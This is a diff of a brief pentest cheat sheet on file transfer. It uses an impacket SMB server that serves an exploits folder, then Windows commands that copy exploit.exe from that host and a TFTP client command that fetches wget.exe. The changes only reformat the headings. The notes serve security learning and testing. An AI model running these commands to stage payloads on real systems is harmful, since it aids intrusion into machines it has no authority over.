@@ -1,18 +1,16 @@
 # SMB Server
-## Server Kali Linux
+- Server Kali Linux
 python /usr/share/doc/python-impacket/examples/smbserver.py share /tmp/exploits
-
-## Client Linux
+- Client Linux
 smblient -L 10.10.10.10 --no-pass
-
-## Client Windows
+- Client Windows
 net view \\10.10.10.10
 dir \\10.10.10.10
 copy \\10.10.10.10\share\exploit.exe .
 
 # TFTP
-## Server
+- Server
 atftpd --daemon --port 69 /tftp
 /etc/init.d/atftpd restart
-## Client
+- Client
 tftp -i 192.160.1.101 GET wget.exe
